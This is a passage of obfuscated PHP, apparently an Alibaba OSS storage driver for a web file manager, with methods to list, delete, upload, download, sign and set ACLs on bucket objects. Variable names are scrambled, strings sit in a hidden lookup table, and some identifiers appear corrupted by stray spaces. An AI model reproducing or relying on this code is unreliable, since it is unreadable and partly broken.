($this->copyFile($Îˆæ—Ê¦, $†¿ıäÓ)) { $this->remove($Îˆæ—Ê¦); return $this->getPathOuter($†¿ıäÓ); } return !1; } public function delFile($÷ËÏ÷™») { try { $this->client->deleteObject($this->bucket, $this->pathEncode($÷ËÏ÷™»)); } catch (OSS\Core\OssException $„šµÈºò) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $„šµÈºò->getMessage()); return !1; } return !0; } public function delFolder($¯ï”³İ) { $ÇßÔú–‹ =& $_SERVER[§Êá¸İ]; if (!$this->exist($¯ï”³İ)) { return !0; } $this->listItemCache = !1; $œŸé¯Õµ = $this->fileList($¯ï”³İ); $this->listItemCache = !0; $á˜ùªÜ = trim($¯ï”³İ, $ÇßÔú–‹[8]) . $ÇßÔú–‹[8]; if (!empty($¯ï”³İ) && $¯ï”³İ !== $ÇßÔú–‹[228] && !in_array($á˜ùªÜ, $œŸé¯Õµ[$ÇßÔú–‹[85]])) { $œŸé¯Õµ[$ÇßÔú–‹[85]][] = $á˜ùªÜ; } $”ÓÜ²ËÙ = $this->delByBatch($œŸé¯Õµ[$ÇßÔú–‹[86]]); if (!$”ÓÜ²ËÙ) { return !1; } $”ÓÜ²ËÙ = $this->delByBatch($œŸé¯Õµ[$ÇßÔú–‹[85]]); if (!$”ÓÜ²ËÙ) { return !1; } return $this->delFile($á˜ùªÜ); } private function delByBatch($©•ˆü„) { foreach (array_chunk($©•ˆü„, 1000) as $’ÇÆáÛŒ) { try { $this->client->deleteObjects($this->bucket, $’ÇÆáÛŒ); } catch (OSS\Core\OssException $¬¶ÜËŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $¬¶ÜËŠ->getMessage()); return !1; } } return !0; } public function rename($•¬›«°¡, $Æôûñ•è) { return $this->renameObject($•¬›«°¡, $Æôûñ•è); } private function fileInfo($–ˆıõêê, $«ß„×½ = false, $„‰¶×“ì = array()) { $ÓÛ·§ =& $_SERVER[§Êá¸İ]; $òë”½ò = array($ÓÛ·§[32] => $this->pathThis($–ˆıõêê), $ÓÛ·§[87] => $this->getPathOuter($–ˆıõêê), $ÓÛ·§[33] => $ÓÛ·§[230], $ÓÛ·§[79] => isset($„‰¶×“ì[$ÓÛ·§[79]]) ? $„‰¶×“ì[$ÓÛ·§[79]] : 0, $ÓÛ·§[169] => $this->ext($–ˆıõêê)); if ($«ß„×½) { return $òë”½ò; } $òë”½ò[$ÓÛ·§[231]] = $òë”½ò[$ÓÛ·§[88]] = 0; $òë”½ò[$ÓÛ·§[232]] = $òë”½ò[$ÓÛ·§[233]] = !0; if (empty($„‰¶×“ì)) { $Ù€ƒø¥Î = $this->objectMeta($–ˆıõêê); if (!$Ù€ƒø¥Î) { return $òë”½ò; } $„‰¶×“ì = array($ÓÛ·§[88] => strtotime($Ù€ƒø¥Î[$ÓÛ·§[1487]]), $ÓÛ·§[79] => $Ù€ƒø¥Î[$ÓÛ·§[1486]] + 0, $ÓÛ·§[1485] => $Ù€ƒø¥Î[$ÓÛ·§[1485]]); } if (isset($„‰¶×“ì[$ÓÛ·§[1485]]) && $„‰¶×“ì[$ÓÛ·§[1485]]) { $òë”½ò[$ÓÛ·§[235]] = trim($„‰¶×“ì[$ÓÛ·§[1485]], $ÓÛ·§[121]); } if (isset($„‰¶×“ì[$ÓÛ·§[79]])) { $òë”½ò[$ÓÛ·§[79]] = $„‰¶×“ì[$ÓÛ·§[79]]; } if (isset($„‰¶×“ì[$ÓÛ·§[88]])) { $òë”½ò[$ÓÛ·§[88]] = $„‰¶×“ì[$ÓÛ·§[88]]; } if (isset($„‰¶×“ì[$ÓÛ·§[206]]) && !trim($òë”½ò[$ÓÛ·§[88]])) { $òë”½ò[$ÓÛ·§[88]] = $„‰¶×“ì[$ÓÛ·§[206]]; } return $òë”½ò; } private function folderInfo($ÎÇõ©İ´, $²ˆŸˆ—‚ = false, $Ú††í¹ù = array()) { $µ§”èä¥ =& $_SERVER[§Êá¸İ]; $Ä‹´° = array($µ§”èä¥[32] => $this->pathThis($ÎÇõ©İ´), $µ§”èä¥[87] => $this->getPathOuter($µ§”èä¥[8] . $ÎÇõ©İ´), $µ§”èä¥[33] => $µ§”èä¥[78]); if ($²ˆŸˆ—‚) { return $Ä‹´°; } $Ä‹´°[$µ§”èä¥[231]] = $Ä‹´°[$µ§”èä¥[88]] = 0; $Ä‹´°[$µ§”èä¥[232]] = $Ä‹´°[$µ§”èä¥[233]] = !0; if (empty($Ú††í¹ù)) { $ÎÇõ©İ´ = rtrim($ÎÇõ©İ´, $µ§”èä¥[8]) . $µ§”èä¥[8]; $üôÓŒ›ì = $this->objectMeta($ÎÇõ©İ´); if (!$üôÓŒ›ì) { return $Ä‹´°; } $Ú††í¹ù = array($µ§”èä¥[231] => $üôÓŒ›ì[$µ§”èä¥[583]][$µ§”èä¥[1490]], $µ§”èä¥[88] => strtotime($üôÓŒ›ì[$µ§”èä¥[1487]])); } if (isset($Ú††í¹ù[$µ§”èä¥[88]])) { $Ä‹´°[$µ§”èä¥[88]] = $Ú††í¹ù[$µ§”èä¥[88]]; } if (isset($Ú††í¹ù[$µ§”èä¥[231]])) { $Ä‹´°[$µ§”èä¥[231]] = $Ú††í¹ù[$µ§”èä¥[231]]; } return $Ä‹´°; } public function listPath($•ù¶Ì©¿, $¥³¢§¡¤ = false) { $§ÚÃö” =& $_SERVER[§Êá¸İ]; $ˆâ§Û»ø = $this->fileList($•ù¶Ì©¿, $§ÚÃö”[8], !0); foreach ($ˆâ§Û»ø[$§ÚÃö”[85]] as $ºËæªÁ‚ => $äß”ã) { $ˆâ§Û»ø[$§ÚÃö”[85]][$ºËæªÁ‚] = $this->folderInfo($äß”ã, $¥³¢§¡¤, $äß”ã); } foreach ($ˆâ§Û»ø[$§ÚÃö”[86]] as $ºËæªÁ‚ => $äß”ã) { $ˆâ§Û»ø[$§ÚÃö”[86]][$ºËæªÁ‚] = $this->fileInfo($äß”ã[$§ÚÃö”[32]], $¥³¢§¡¤, $äß”ã); } return $ˆâ§Û»ø; } protected function infoChildren($ª‘¨“È, &$¤‰ÖåÙ) { $åö¼ £µ =& $_SERVER[§Êá¸İ]; $ıŠ‚Èêü = $this->fileList($ª‘¨“È, $åö¼ £µ[12], !0); $¤‰ÖåÙ[$åö¼ £µ[81]] += count($ıŠ‚Èêü[$åö¼ £µ[85]]); $¤‰ÖåÙ[$åö¼ £µ[80]] += count($ıŠ‚Èêü[$åö¼ £µ[86]]); foreach ($ıŠ‚Èêü[$åö¼ £µ[86]] as $­Ùî¾£ï) { if (!$­Ùî¾£ï || !$­Ùî¾£ï[$åö¼ £µ[79]]) { continue; } $¤‰ÖåÙ[$åö¼ £µ[79]] += $­Ùî¾£ï[$åö¼ £µ[79]]; } } public function has($¶”‡»áù, $„ıÔĞÅ = false, $…ÂÃªáù = true) { $º¬ĞŸá· =& $_SERVER[§Êá¸İ]; $¶”‡»áù = trim($¶”‡»áù, $º¬ĞŸá·[8]); $µª¥†ò¦ = empty($¶”‡»áù) && $¶”‡»áù !== $º¬ĞŸá·[228] ? $º¬ĞŸá·[12] : $¶”‡»áù . $º¬ĞŸá·[8]; $¥€äô–ö = $º¬ĞŸá·[12]; $¼ÔÜÜÈ¤ = 500; $ÙÂœÁ€È = $­ğÆàÎ = 0; while (!0) { check_abort(); $Ó²®Ûëµ = array($º¬ĞŸá·[1481] => $º¬ĞŸá·[8], $º¬ĞŸá·[1482] => $µª¥†ò¦, $º¬ĞŸá·[1483] => $¼ÔÜÜÈ¤, $º¬ĞŸá·[1484] => $¥€äô–ö); try { $À·¹ä±æ = $this->client->listObjects($this->bucket, $Ó²®Ûëµ); } catch (OSS\Core\OssException $‰âà³˜ô) { $this->writeLog(__FUNCTION__ . $º¬ĞŸá·[214] . $‰âà³˜ô->getMessage()); break; } $¥€äô–ö = $À·¹ä±æ->getNextMarker(); $ïûà™Ø× = $À·¹ä±æ->getObjectList(); $İ¼°™ÎŞ = $À·¹ä±æ->getPrefixList(); if ($„ıÔĞÅ) { if (count($ïûà™Ø×) > 1 || count($ïûà™Ø×) == 1 && $ïûà™Ø×[0]->getKey() != $µª¥†ò¦) { $ÙÂœÁ€È += count($ïûà™Ø×) - 1; } if (!empty($İ¼°™ÎŞ)) { $­ğÆàÎ += count($İ¼°™ÎŞ); } if ($¥€äô–ö === $º¬ĞŸá·[12]) { break; } continue; } if ($…ÂÃªáù) { if (!empty($ïûà™Ø×)) { if (count($ïûà™Ø×) > 1 || $ïûà™Ø×[0]->getKey() != $µª¥†ò¦) { return !0; } } } else { if (!empty($İ¼°™ÎŞ)) { return !0; } } if ($¥€äô–ö === $º¬ĞŸá·[12]) { break; } } if ($„ıÔĞÅ) { return array($º¬ĞŸá·[239] => $ÙÂœÁ€È, $º¬ĞŸá·[240] => $­ğÆàÎ); } return !1; } public function listAll($¸Ú‡í) { $áËêÑí¿ =& $_SERVER[§Êá¸İ]; $ó¡İ¥•© = $this->fileList($¸Ú‡í, $áËêÑí¿[12], !0); $ûÓø‰ç˜ = array_to_keyvalue($ó¡İ¥•©[$áËêÑí¿[86]], $áËêÑí¿[32]); foreach ($ó¡İ¥•©[$áËêÑí¿[85]] as $êø×²»†) { if (is_string($êø×²»†)) { $ûÓø‰ç˜[$êø×²»†] = array($áËêÑí¿[79] => 0); } } return $this->listAllFiles($¸Ú‡í, $ûÓø‰ç˜); } public function canRead($â»Ÿı£Æ) { $’ Ö„Ä” =& $_SERVER[§Êá¸İ]; $¦İ³İîĞ = $this->pathAcl($â»Ÿı£Æ); return $¦İ³İîĞ == $’ Ö„Ä”[1491] || $¦İ³İîĞ == $’ Ö„Ä”[627] ? !0 : !1; } public function canWrite($¿ Ğˆåµ) { $‚ò°Â¹× = $this->pathAcl($¿ Ğˆåµ); return $‚ò°Â¹× == $_SERVER[§Êá¸İ][627] ? !0 : !1; } public function pathAcl($Óğ¼¿ª) { $å±°ö£× =& $_SERVER[§Êá¸İ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $çÎñì½ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Óğ¼¿ª)); } catch (OSS\Core\OssException $İ×Û¿îÎ) { $this->writeLog(__FUNCTION__ . $å±°ö£×[214] . $İ×Û¿îÎ->getMessage()); return !1; } $²âëÑ¯ = $çÎñì½ == $å±°ö£×[37] ? $this->bucketAcl : $çÎñì½; if ($²âëÑ¯ == $å±°ö£×[1492]) { return $å±°ö£×[1491]; } if ($²âëÑ¯ == $å±°ö£×[1493]) { return $å±°ö£×[627]; } return $²âëÑ¯; } private function chmodPath($ª¤üçÊ§, $Í¿Ä¿¥ = '') { $ÑÄÏÎÏ =& $_SERVER[§Êá¸İ]; $È­šŒñ¥ = empty($Í¿Ä¿¥) ? $ÑÄÏÎÏ[1493] : $Í¿Ä¿¥; $à¦½›¡¥ = array($ÑÄÏÎÏ[37], $ÑÄÏÎÏ[229], $ÑÄÏÎÏ[1492], $ÑÄÏÎÏ[1493]); if (!in_array($È­šŒñ¥, $à¦½›¡¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ª¤üçÊ§), $È­šŒñ¥); } catch (OSS\Core\OssException $ò‰¡Ú¦) { $this->writeLog(__FUNCTION__ . $ÑÄÏÎÏ[214] . $ò‰¡Ú¦->getMessage()); return !1; } return !0; } public function getContent($ÉŞ€²¿ª) { return $this->fileSubstr($ÉŞ€²¿ª, -1); } public function setContent($è´çÕçë, $ò¿¿Ï±’ = '') { $¤ÚöÒ˜ú =& $_SERVER[§Êá¸İ]; try { $È–šÈ˜â = $this->trafficLimit($¤ÚöÒ˜ú[1494]); $à¹ªûûÏ = $this->client->putObject($this->bucket, $this->pathEncode($è´çÕçë), $ò¿¿Ï±’, $È–šÈ˜â); } catch (OSS\Core\OssException $¯‡”ÃÙ) { $this->writeLog(__FUNCTION__ . $¤ÚöÒ˜ú[214] . $¯‡”ÃÙ->getMessage()); return !1; } $š“èĞ¸ = array($¤ÚöÒ˜ú[1488] => trim($à¹ªûûÏ[$¤ÚöÒ˜ú[1485]], $¤ÚöÒ˜ú[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($è´çÕçë))); $this->updateObjMeta($è´çÕçë, $š“èĞ¸); return isset($à¹ªûûÏ[$¤ÚöÒ˜ú[1495]][$¤ÚöÒ˜ú[292]]) ? !0 : !1; } private function updateObjMeta($¨ñî–ûÓ, $¸˜°áÂÉ) { $¨ñî–ûÓ = $this->pathEncode($¨ñî–ûÓ); try { $ÒÔõ®˜· = array(OSS\OssClient::OSS_HEADERS => $¸˜°áÂÉ); $this->client->copyObject($this->bucket, $¨ñî–ûÓ, $this->bucket, $¨ñî–ûÓ, $ÒÔõ®˜·); } catch (OSS\Core\OssException $ïÀ­€¯¸) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $ïÀ­€¯¸->getMessage()); return !1; } return !0; } public function upload($ø¨âªê”, $¼±ãù§ì, $ÇÃ‹â´ = false, $Œªğ† = REPEAT_REPLACE) { $ßÈôÊ¹ =& $_SERVER[§Êá¸İ]; $Ú¹îŒ¡² = trim($ø¨âªê”, $ßÈôÊ¹[8]); $ª­‚§Ñ³ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ßÈôÊ¹[1488] => @md5_file($¼±ãù§ì)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ø¨âªê”))); $ª­‚§Ñ³ = $this->trafficLimit($ßÈôÊ¹[1494], $ª­‚§Ñ³); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ú¹îŒ¡²), $¼±ãù§ì, $ª­‚§Ñ³); } catch (OSS\Core\OssException $˜œ†Ä¹ğ) { $this->writeLog(__FUNCTION__ . $ßÈôÊ¹[214] . $˜œ†Ä¹ğ->getMessage()); return !1; } return $this->getPathOuter($ø¨âªê”); } public function getHost() { $ÇÃ×ö«é =& $_SERVER[§Êá¸İ]; $ÙÅ”üÌ» = explode($ÇÃ×ö«é[210], parent::getHost()); return $ÙÅ”üÌ»[0] . $ÇÃ×ö«é[210] . $this->bucket . $ÇÃ×ö«é[10] . $ÙÅ”üÌ»[1]; } public function uploadFormData($¹Œ¾•¿ü, $Å´Îƒ†¦ = 3600) { $¬äèÆ± =& $_SERVER[§Êá¸İ]; if (!($–ßÒ¥Úö = $this->getHost())) { return !1; } $ìÇ²«ÍÙ = $Å´Îƒ†¦; $©Õ¬Ø¿ = date($¬äèÆ±[1496], time() + $ìÇ²«ÍÙ); $Ò¬‚Éåª = new DateTime($©Õ¬Ø¿); $åáÍò = $Ò¬‚Éåª->format(DateTime::ISO8601); $–Ú²Í»— = strpos($åáÍò, $¬äèÆ±[372]); $åáÍò = substr($åáÍò, 0, $–Ú²Í»—) . $¬äèÆ±[1497]; $Çğí£ñ = 1048576000 * 5; $­¦Úö‹ = $this->pathFather($¹Œ¾•¿ü); $ÌêÀ‹“ê = array($¬äèÆ±[275] => $åáÍò, $¬äèÆ±[278] => array(array($¬äèÆ±[1498], 0, $Çğí£ñ), array($¬äèÆ±[281], $¬äèÆ±[282], $­¦Úö‹))); $ÖíÈ˜ìœ = base64_encode(json_encode($ÌêÀ‹“ê)); $Œ™­îİ = base64_encode(hash_hmac($¬äèÆ±[263], $ÖíÈ˜ìœ, $this->secret, !0)); $±®ÔÄ´É = array($¬äèÆ±[293] => $ÖíÈ˜ìœ, $¬äèÆ±[1499] => $this->accessKey, $¬äèÆ±[285] => $¬äèÆ±[274], $¬äèÆ±[1500] => $Œ™­îİ, $¬äèÆ±[208] => $–ßÒ¥Úö); $±®ÔÄ´É = $this->trafficLimit($¬äèÆ±[1494], $±®ÔÄ´É); return $±®ÔÄ´É; } public function multiUploadFormData($Å¡óÆ , $íâÄØÑ = 3600) { $™öÎ±ó» =& $_SERVER[§Êá¸İ]; if (!($ĞÖÂË—Í = $this->getHost())) { return !1; } $¥³İÄ³é = $this->trafficLimit($™öÎ±ó»[1494]); $„ä½æ¢î = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Å¡óÆ ), $¥³İÄ³é); return array($™öÎ±ó»[254] => $„ä½æ¢î, $™öÎ±ó»[208] => $ĞÖÂË—Í . $™öÎ±ó»[8] . $this->pathEncode($Å¡óÆ ), $™öÎ±ó»[255] => gmdate($™öÎ±ó»[1501]), $™öÎ±ó»[97] => $Å¡óÆ ); } public function multiUploadAuthData($ÉâŞñ–™, $¯ÜÑõ½­ = array()) { $îÛ®“Ô© =& $_SERVER[§Êá¸İ]; $€‚°ß·ü = isset($¯ÜÑõ½­[$îÛ®“Ô©[255]]) ? $¯ÜÑõ½­[$îÛ®“Ô©[255]] : gmdate($îÛ®“Ô©[1501]); $Â•Å†‚ç = isset($¯ÜÑõ½­[$îÛ®“Ô©[169]]) ? $¯ÜÑõ½­[$îÛ®“Ô©[169]] : $îÛ®“Ô©[12]; $™ å‘ğÒ = $ÉâŞñ–™; if (isset($¯ÜÑõ½­[$îÛ®“Ô©[97]])) { $™ å‘ğÒ = $¯ÜÑõ½­[$îÛ®“Ô©[97]]; unset($¯ÜÑõ½­[$îÛ®“Ô©[97]]); } if (isset($¯ÜÑõ½­[$îÛ®“Ô©[256]])) { $¯ÜÑõ½­[$îÛ®“Ô©[255]] = $€‚°ß·ü; return $this->listUploadParts($™ å‘ğÒ, $¯ÜÑõ½­); } $ ‘‹»Ã¼ = array($îÛ®“Ô©[257], $îÛ®“Ô©[12], $îÛ®“Ô©[123], $€‚°ß·ü, "\170\55\x6f\163\x73\55\x64\x61\164\145\72{$€‚°ß·ü}", $îÛ®“Ô©[8] . $this->bucket . $îÛ®“Ô©[8] . $™ å‘ğÒ . $Â•Å†‚ç); if (strpos($Â•Å†‚ç, $îÛ®“Ô©[258]) === 0) { $ ‘‹»Ã¼[0] = $îÛ®“Ô©[259]; if ($å×ıæ×´ = $this->trafficLimit($îÛ®“Ô©[1494])) { $™ å‘ğÒ = $îÛ®“Ô©[1502]; array_splice($ ‘‹»Ã¼, 5, 0, $™ å‘ğÒ . $îÛ®“Ô©[4] . $å×ıæ×´[$™ å‘ğÒ]); } } if (isset($¯ÜÑõ½­[$îÛ®“Ô©[260]]) && $¯ÜÑõ½­[$îÛ®“Ô©[260]] == $îÛ®“Ô©[261]) { $ ‘‹»Ã¼[0] = $îÛ®“Ô©[261]; } if (!empty($¯ÜÑõ½­[$îÛ®“Ô©[1503]])) { $î ˆÑ±õ = array_merge(array($ ‘‹»Ã¼[4]), $¯ÜÑõ½­[$îÛ®“Ô©[1503]]); sort($î ˆÑ±õ); $ ‘‹»Ã¼[4] = implode($îÛ®“Ô©[262], $î ˆÑ±õ); } $÷‹şŠ«İ = implode($îÛ®“Ô©[262], $ ‘‹»Ã¼); $ı„©æ— = base64_encode(hash_hmac($îÛ®“Ô©[263], $÷‹şŠ«İ, $this->secret, !0)); $ıÅËë”„ = $îÛ®“Ô©[1471] . $this->accessKey . $îÛ®“Ô©[4] . $ı„©æ—; if (strpos($Â•Å†‚ç, $îÛ®“Ô©[258]) === 0) { $ıÅËë”„ = array($îÛ®“Ô©[265] => $ıÅËë”„, $îÛ®“Ô©[255] => $€‚°ß·ü); if ($å×ıæ×´) { $ıÅËë”„ = array_merge($ıÅËë”„, $å×ıæ×´); } } return $ıÅËë”„; } public function listUploadParts($¿ŞÛæÜ‡, $¤âÊ‚) { $ĞŸßÓ— =& $_SERVER[§Êá¸İ]; $¡’ÌÒ³Ó = parse_url_query($¤âÊ‚[$ĞŸßÓ—[169]]); $ğìæáåÚ = $this->client->listParts($this->bucket, $this->pathEncode($¿ŞÛæÜ‡), $¡’ÌÒ³Ó[$ĞŸßÓ—[254]]); $êù…–ÕÓ = $ğìæáåÚ->getListPart(); $É»’»Ñº = array(); foreach ($êù…–ÕÓ as $óÔİÍ·ñ) { $É»’»Ñº[] = array($ĞŸßÓ—[308] => $óÔİÍ·ñ->getPartNumber(), $ĞŸßÓ—[309] => trim($óÔİÍ·ñ->getETag(), $ĞŸßÓ—[121])); } unset($¤âÊ‚[$ĞŸßÓ—[256]], $¤âÊ‚[$ĞŸßÓ—[260]]); $ßˆü ‚÷ = $this->multiUploadAuthData($¿ŞÛæÜ‡, $¤âÊ‚); if (empty($ßˆü ‚÷)) { return !1; } return array($ĞŸßÓ—[265] => $ßˆü ‚÷, $ĞŸßÓ—[255] => $¤âÊ‚[$ĞŸßÓ—[255]], $ĞŸßÓ—[267] => $É»’»Ñº); } public function download($íÇ•ïÁí, $Ë°âÙñø) { $¿óºªšØ =& $_SERVER[§Êá¸İ]; if ($this->isFolder($íÇ•ïÁí)) { return !1; } try { $îÎè„ôŞ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ë°âÙñø); $îÎè„ôŞ = $this->trafficLimit($¿óºªšØ[112], $îÎè„ôŞ); $this->client->getObject($this->bucket, $this->pathEncode($íÇ•ïÁí), $îÎè„ôŞ); } catch (OSS\Core\OssException $ø†ªØ‘ì) { $this->writeLog(__FUNCTION__ . $¿óºªšØ[214] . $ø†ªØ‘ì->getMessage()); return !1; } return $Ë°âÙñø; } public function fileSubstr($Ëºâ²ô, $¢‡£Şİ³ = 0, $á“ã¬ = false) { if ($¢‡£Şİ³ === -1) { $³÷ğıšõ = array(); } else { if ($á“ã¬ === !1) { $±¯¿öê× = $this->size($Ëºâ²ô); } else { $±¯¿öê× = $¢‡£Şİ³ + $á“ã¬ - 1; } $³÷ğıšõ = array(OSS\OssClient::OSS_RANGE => "{$¢‡£Şİ³}\x2d{$±¯¿öê×}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ëºâ²ô), $³÷ğıšõ); } catch (OSS\Core\OssException $š‡İ«) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][214] . $š‡İ«->getMessage()); think_exception($š‡İ«->getMessage()); return !1; } } private function trafficLimit($ÍèïÙ¬, $æ†ûÂÒÛ = array()) { $ğ¯áñÜ =& $_SERVER[§Êá¸İ]; if ($ÍèïÙ¬ == $ğ¯áñÜ[1494] && $this->isUploadServer() || $ÍèïÙ¬ == $ğ¯áñÜ[112] && $this->isFileOutServer()) { return $æ†ûÂÒÛ; } $’âŞ­ü› = floatval($GLOBALS[$ğ¯áñÜ[6]][$ğ¯áñÜ[92]][$ğ¯áñÜ[110]][$ÍèïÙ¬]) * 1024 * 1024 * 8; if (!$’âŞ­ü›) { return $æ†ûÂÒÛ; } $’âŞ­ü› = $’âŞ­ü› < 819200 ? 819200 : ($’âŞ­ü› > 838860800 ? 838860800 : $’âŞ­ü›); $æ†ûÂÒÛ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($’âŞ­ü›); return $æ†ûÂÒÛ; } public function link($š–ñÀ, $Ğ«¿ŒÄ = array()) { $…¹‘ĞˆÈ =& $_SERVER[§Êá¸İ]; if (!$this->exist($š–ñÀ) || $this->isFolder($š–ñÀ)) { return !1; } try { $Ğ«¿ŒÄ = $this->trafficLimit($…¹‘ĞˆÈ[112], $Ğ«¿ŒÄ); $à«œÜ‹ô = $this->client->signUrl($this->bucket, $this->pathEncode($š–ñÀ), 3600 * 12, $…¹‘ĞˆÈ[261], $Ğ«¿ŒÄ); return $this->getCdnLink($à«œÜ‹ô); } catch (OSS\Core\OssException $…’…ÈÙÂ) { $this->writeLog(__FUNCTION__ . $…¹‘ĞˆÈ[214] . $…’…ÈÙÂ->getMessage()); return !1; } } public function fileOut($°¸ğ°©”, $àô‘ÂÙ¯ = false, $¸¤ø®…š = false, $Â“û“ë† = '') { $ı¹Ëé÷ó =& $_SERVER[§Êá¸İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($°¸ğ°©”, $àô‘ÂÙ¯, $¸¤ø®…š, $Â“û“ë†); } if (!$¸¤ø®…š) { $¸¤ø®…š = $this->pathThis($°¸ğ°©”); } $¸¤ø®…š = rawurlencode($¸¤ø®…š); $®İÉŒ„Š = get_file_mime(get_path_ext($¸¤ø®…š)); if ($®İÉŒ„Š == $ı¹Ëé÷ó[248]) { return parent::fileOut($°¸ğ°©”, $àô‘ÂÙ¯, $¸¤ø®…š, $Â“û“ë†); } $àô‘ÂÙ¯ = $àô‘ÂÙ¯ ? $ı¹Ëé÷ó[1504] : $ı¹Ëé÷ó[1505]; $²Ëø˜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ı¹Ëé÷ó[1506] . rawurlencode("{$àô‘ÂÙ¯}\73\x66\x69\x6c\x65\156\141\x6d\145\75{$¸¤ø®…š}")); $²Ëø˜[OSS\OssClient::OSS_SUB_RESOURCE] .= $ı¹Ëé÷ó[1507] . rawurlencode($®İÉŒ„Š); $·š—ÌØ = $this->link($°¸ğ°©”, $²Ëø˜); $this->fileOutLink($·š—ÌØ); } public function fileOutServer($ªº†Ü¸, $äÓŒÙˆ = false, $¥ÓÏÁúÖ = false, $ğ£ıß‡Ñ = '') { parent::fileOut($ªº†Ü¸, $äÓŒÙˆ, $¥ÓÏÁúÖ, $ğ£ıß‡Ñ); } public function fileOutImage($¡ëÅ™ú, $ëÍÃõ¸‡ = 250) { if ($this->size($¡ëÅ™ú) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡ëÅ™ú, $ëÍÃõ¸‡); } $®¹ŠÌƒ¸ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[§Êá¸İ][1468] . $ëÍÃõ¸‡); $‘¤ş‹ª£ = $this->link($¡ëÅ™ú, $®¹ŠÌƒ¸); $this->fileOutLink($‘¤ş‹ª£); } public function fileOutImageServer($äÄæîÍ, $Ö‹íËó’ = 250) { parent::fileOutImage($äÄæîÍ, $Ö‹íËó’); } public function fileOutLink($Ïé®Şø) { $ÜÉ±Â¸º =& $_SERVER[§Êá¸İ]; if (!$this->isCdnHost() && substr($Ïé®Şø, 0, 7) == $ÜÉ±Â¸º[313]) { $Ïé®Şø = $ÜÉ±Â¸º[314] . substr($Ïé®Şø, 7); } header($ÜÉ±Â¸º[175] . $Ïé®Şø); die; } public function hashMd5($‰¹³™‰Ü, $ñÄêˆÊ¬ = '') { $°Î…Ğóâ =& $_SERVER[§Êá¸İ]; $ìã ¼Èİ = $this->_objectMeta($‰¹³™‰Ü); if (!$ìã ¼Èİ) { return $°Î…Ğóâ[12]; } if (!isset($ìã ¼Èİ[$°Î…Ğóâ[1488]]) && !empty($ñÄêˆÊ¬)) { $ßöŠ†ÇÑ = $this->updateObjMeta($‰¹³™‰Ü, array($°Î…Ğóâ[1488] => $ñÄêˆÊ¬)); $ìã ¼Èİ[$°Î…Ğóâ[1488]] = $ßöŠ†ÇÑ ? $ñÄêˆÊ¬ : $°Î…Ğóâ[12]; } return isset($ìã ¼Èİ[$°Î…Ğóâ[1488]]) ? strtolower($ìã ¼Èİ[$°Î…Ğóâ[1488]]) : $°Î…Ğóâ[12]; } public function size($¦™¡Ø¹) { $€¦¤×Â¡ = $this->objectMeta($¦™¡Ø¹); return $€¦¤×Â¡ ? $€¦¤×Â¡[$_SERVER[§Êá¸İ][79]] : 0; } public function info($çï¤¶¸ñ) { if ($this->isFolder($çï¤¶¸ñ)) { return $this->folderInfo($çï¤¶¸ñ); } else { if ($this->isFile($çï¤¶¸ñ)) { return $this->fileInfo($çï¤¶¸ñ); } } return !1; } public function exist($ÉùôÙª) { return $this->isFile($ÉùôÙª) || $this->isFolder($ÉùôÙª); } public function isFile($½¤€¦¢Ó) { return !$this->isFolder($½¤€¦¢Ó) && $this->objectMeta($½¤€¦¢Ó); } public function isFolder($»³ğä¤õ) { return $this->cacheMethod($_SERVER[§Êá¸İ][179], $»³ğä¤õ); } protected function objectMeta($‘Äù›‹) { return $this->cacheMethod($_SERVER[§Êá¸İ][181], $‘Äù›‹); } protected function _objectMeta($È«Ì–†¼) { $“”„Áú§ =& $_SERVER[§Êá¸İ]; try { $ù„àÙ—ş = $this->client->getObjectMeta($this->bucket, $this->pathEncode($È«Ì–†¼)); } catch (OSS\Core\OssException $³¥ †Äº) { $this->writeLog(__FUNCTION__ . $“”„Áú§[214] . $³¥ †Äº->getMessage()); $ù„àÙ—ş = !1; } if ($ù„àÙ—ş) { $ù„àÙ—ş[$“”„Áú§[79]] = intval($ù„àÙ—ş[$“”„Áú§[1486]]); } return $ù„àÙ—ş; } protected function _isFolder($ëæï¤ô) { $ŞÁàòª =& $_SERVER[§Êá¸İ]; if ($ëæï¤ô == $ŞÁàòª[12] || $ëæï¤ô == $ŞÁàòª[8]) { return !0; } $®¡ßŠş® = array($ŞÁàòª[1481] => $ŞÁàòª[8], $ŞÁàòª[1482] => rtrim($ëæï¤ô, $ŞÁàòª[8]) . $ŞÁàòª[8], $ŞÁàòª[1483] => 1, $ŞÁàòª[1484] => $ŞÁàòª[12]); $Ô©‡Ä¤ = $this->client->listObjects($this->bucket, $®¡ßŠş®); if ($Ô©‡Ä¤->getObjectList() || $Ô©‡Ä¤->getPrefixList()) { return !0; } return !1; } public function writeLog($ÛºÏ¢Ô÷ = '', $ëíÊå = false) { $•µşè×ø =& $_SERVER[§Êá¸İ]; $äæÓÍ‘Æ = in_array(ACTION, array($•µşè×ø[212], $•µşè×ø[213])); if (!$äæÓÍ‘Æ && !GLOBAL_DEBUG) { return; } $èÖ‹¹êÔ = 0; if (stripos($ÛºÏ¢Ô÷, $•µşè×ø[1508]) !== !1) { $èÖ‹¹êÔ = 1; $æ¯šĞ±¿ = explode($•µşè×ø[1509], $ÛºÏ¢Ô÷); $ÛºÏ¢Ô÷ = !empty($æ¯šĞ±¿[1]) ? $æ¯šĞ±¿[1] : $ÛºÏ¢Ô÷; } else 